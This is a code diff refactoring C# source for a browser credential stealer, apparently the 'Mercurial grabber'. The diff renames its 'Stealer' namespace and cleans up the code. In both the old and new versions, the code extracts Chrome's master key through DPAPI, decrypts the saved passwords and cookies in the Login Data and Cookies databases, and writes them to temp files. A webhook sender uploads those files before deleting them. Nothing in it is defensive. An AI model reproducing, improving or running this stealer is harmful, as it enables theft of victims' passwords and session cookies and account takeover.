@@ -3,217 +3,178 @@ using System.Text;
 
 using System.IO;
 using System.Security.Cryptography;
-namespace Stealer
+namespace Mercurial.Resources
 {
-    class Browser
+    public class Browser
     {
-        private static string DecryptWithKey(byte[] encryptedData, byte[] MasterKey) /
+        private static string DecryptWithKey(byte[] encryptedData, byte[] masterKey)
         {
-            byte[] iv = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; 
-
-            
+            byte[] iv = new byte[12];
             Array.Copy(encryptedData, 3, iv, 0, 12);
 
             try
             {
-                
-                byte[] Buffer = new byte[encryptedData.Length - 15];
-                Array.Copy(encryptedData, 15, Buffer, 0, encryptedData.Length - 15);
+                byte[] buffer = new byte[encryptedData.Length - 15];
+                Array.Copy(encryptedData, 15, buffer, 0, buffer.Length);
 
-                byte[] tag = new byte[16]; 
-                byte[] data = new byte[Buffer.Length - tag.Length]; 
+                byte[] tag = new byte[16];
+                byte[] data = new byte[buffer.Length - tag.Length];
 
-               
-                Array.Copy(Buffer, Buffer.Length - 16, tag, 0, 16);
+                Array.Copy(buffer, buffer.Length - 16, tag, 0, 16);
+                Array.Copy(buffer, 0, data, 0, data.Length);
 
-                
-                Array.Copy(Buffer, 0, data, 0, Buffer.Length - tag.Length);
-
-                AesGcm aesDecryptor = new AesGcm();
-                var result = Encoding.UTF8.GetString(aesDecryptor.Decrypt(MasterKey, iv, null, data, tag));
-                return result;
+                using (var aesGcm = new AesGcm(masterKey))
+                {
+                    byte[] plaintext = new byte[data.Length];
+                    aesGcm.Decrypt(iv, data, tag, plaintext);
+                    return Encoding.UTF8.GetString(plaintext);
+                }
             }
             catch
             {
                 return null;
             }
         }
+
         private static byte[] GetMasterKey()
         {
             string filePath = User.localAppData + @"\Google\Chrome\User Data\Local State";
-            byte[] masterKey = new byte[] { };
-
-            if (File.Exists(filePath) == false)
+            if (!File.Exists(filePath))
                 return null;
 
-            var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath));
+            var match = System.Text.RegularExpressions.Regex.Match(
+                File.ReadAllText(filePath),
+                "\"encrypted_key\":\"(.*?)\""
+            );
 
-            foreach (System.Text.RegularExpressions.Match prof in pattern)
-            {
-                if (prof.Success)
-                {
-                    masterKey = Convert.FromBase64String((prof.Groups[1].Value)); 
+            if (!match.Success)
+                return null;
 
-                }
-
-            }
-
-           
+            byte[] masterKey = Convert.FromBase64String(match.Groups[1].Value);
             byte[] temp = new byte[masterKey.Length - 5];
-            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);
+            Array.Copy(masterKey, 5, temp, 0, temp.Length);
 
             try
             {
                 return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
             }
-            catch (Exception ex)
+            catch
             {
-                Console.WriteLine(ex.ToString());
                 return null;
             }
         }
 
-
-
         public static void StealCookies()
         {
-            string src = User.localAppData + @"\Google\Chrome\User Data\default\Cookies";
+            string src = User.localAppData + @"\Google\Chrome\User Data\Default\Cookies";
             string stored = User.tempFolder + "\\cookies.db";
 
             if (File.Exists(src))
             {
-                Console.WriteLine("Located: " + src);
                 try
                 {
-                    File.Copy(src, stored);
-                }
-                catch
-                {
-                }
-                try
-                {
+                    File.Copy(src, stored, true);
                     SQLite db = new SQLite(stored);
-
                     db.ReadTable("cookies");
 
-                    StreamWriter file = new StreamWriter(User.tempFolder + "\\cookies.txt");
-                    for (int i = 0; i <= db.GetRowCount(); i++)
+                    using (StreamWriter file = new StreamWriter(User.tempFolder + "\\cookies.txt"))
                     {
-                        string value = db.GetValue(i, 12);
-                        string hostKey = db.GetValue(i, 1);
-                        string name = db.GetValue(i, 2);
-                        string path = db.GetValue(i, 4);
-                        string expires = "";
-                        try
+                        for (int i = 0; i < db.GetRowCount(); i++)
                         {
-                            expires = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64(db.GetValue(i, 5))), TimeZoneInfo.Local));
-                        }
-                        catch
-                        {
-                        }
+                            string value = db.GetValue(i, 12);
+                            string hostKey = db.GetValue(i, 1);
+                            string name = db.GetValue(i, 2);
+                            string path = db.GetValue(i, 4);
+                            string expires = "";
+                            try
+                            {
+                                expires = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(
+                                    DateTime.FromFileTimeUtc(10 * Convert.ToInt64(db.GetValue(i, 5))),
+                                    TimeZoneInfo.Local));
+                            }
+                            catch { }
 
-                        string result = String.Empty;
+                            string result = "";
+                            try
+                            {
+                                result = DecryptWithKey(Encoding.Default.GetBytes(value), GetMasterKey());
+                            }
+                            catch
+                            {
+                                result = "Error in decryption";
+                            }
 
-                        try
-                        {
-                            result = DecryptWithKey(Encoding.Default.GetBytes(value), GetMasterKey());
+                            file.WriteLine("---------------- mercurial grabber ----------------");
+                            file.WriteLine("value: " + result);
+                            file.WriteLine("hostKey: " + hostKey);
+                            file.WriteLine("name: " + name);
+                            file.WriteLine("expires: " + expires);
                         }
-                        catch
-                        {
-                            result = "Error in deryption";
-                        }
-
-                        file.WriteLine("---------------- mercurial grabber ----------------");
-                        file.WriteLine("value: " + result);
-                        file.WriteLine("hostKey: " + hostKey);
-                        file.WriteLine("name: " + name);
-                        file.WriteLine("expires: " + expires);
                     }
 
-                    file.Close();
-
                     File.Delete(stored);
-
                     Program.wh.SendData("", "cookies.txt", User.tempFolder + "\\cookies.txt", "multipart/form-data");
                     File.Delete(User.tempFolder + "\\cookies.txt");
                 }
-
                 catch (Exception ex)
                 {
                     Program.wh.SendData("", "cookies.db", User.tempFolder + "\\cookies.db", "multipart/form-data");
                     Program.wh.Send("`" + ex.Message + "`");
                 }
             }
-
             else
             {
-                Program.wh.Send("`" + "Did not find: " + src + "`");
+                Program.wh.Send("`Did not find: " + src + "`");
             }
         }
 
-
-
         public static void StealPasswords()
         {
-            string src = User.localAppData + @"\Google\Chrome\User Data\default\Login Data";
-            Console.WriteLine(src);
-
+            string src = User.localAppData + @"\Google\Chrome\User Data\Default\Login Data";
             if (File.Exists(src))
             {
                 string stored = User.tempFolder + "\\login.db";
-                Console.WriteLine("copy to " + stored);
-
                 try
                 {
-                    File.Copy(src, stored);
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine(ex.Message);
-                }
-                try
-                {
+                    File.Copy(src, stored, true);
                     SQLite db = new SQLite(stored);
                     db.ReadTable("logins");
 
-                    StreamWriter file = new StreamWriter(User.tempFolder + "\\passwords.txt");
-                    for (int i = 0; i <= db.GetRowCount(); i++)
+                    using (StreamWriter file = new StreamWriter(User.tempFolder + "\\passwords.txt"))
                     {
-                        string host = db.GetValue(i, 0);
-                        string username = db.GetValue(i, 3);
-                        var password = db.GetValue(i, 5);
-
-                        if (host != null)
+                        for (int i = 0; i < db.GetRowCount(); i++)
                         {
-                            if (password.StartsWith("v10") || password.StartsWith("v11"))
+                            string host = db.GetValue(i, 0);
+                            string username = db.GetValue(i, 3);
+                            string password = db.GetValue(i, 5);
+
+                            if (!string.IsNullOrEmpty(host))
                             {
-                                var masterKey = GetMasterKey();
-
-                                if (masterKey == null)
+                                if (password.StartsWith("v10") || password.StartsWith("v11"))
                                 {
-                                    continue;
-                                }
+                                    var masterKey = GetMasterKey();
+                                    if (masterKey == null)
+                                        continue;
 
-                                try
-                                {
-                                    password = DecryptWithKey(Encoding.Default.GetBytes(password), masterKey);
-                                }
-                                catch
-                                {
-                                    password = "Unable to decrypt";
-                                }
+                                    try
+                                    {
+                                        password = DecryptWithKey(Encoding.Default.GetBytes(password), masterKey);
+                                    }
+                                    catch
+                                    {
+                                        password = "Unable to decrypt";
+                                    }
 
-                                file.WriteLine("---------------- mercurial grabber ----------------");
-                                file.WriteLine("host: " + host);
-                                file.WriteLine("username: " + username);
-                                file.WriteLine("password: " + password);
+                                    file.WriteLine("---------------- mercurial grabber ----------------");
+                                    file.WriteLine("host: " + host);
+                                    file.WriteLine("username: " + username);
+                                    file.WriteLine("password: " + password);
+                                }
                             }
                         }
                     }
 
-                    file.Close();
                     File.Delete(stored);
-
                     Program.wh.SendData("", "passwords.txt", User.tempFolder + "\\passwords.txt", "multipart/form-data");
                     File.Delete(User.tempFolder + "\\passwords.txt");
                 }
@@ -222,13 +183,11 @@ namespace Stealer
                     Program.wh.SendData("", "login.db", User.tempFolder + "\\login.db", "multipart/form-data");
                     Program.wh.Send("`" + ex.Message + "`");
                 }
-
             }
             else
             {
-                Program.wh.Send("`" + "Did not find: " + src + "`");
+                Program.wh.Send("`Did not find: " + src + "`");
             }
-
         }
     }
 }
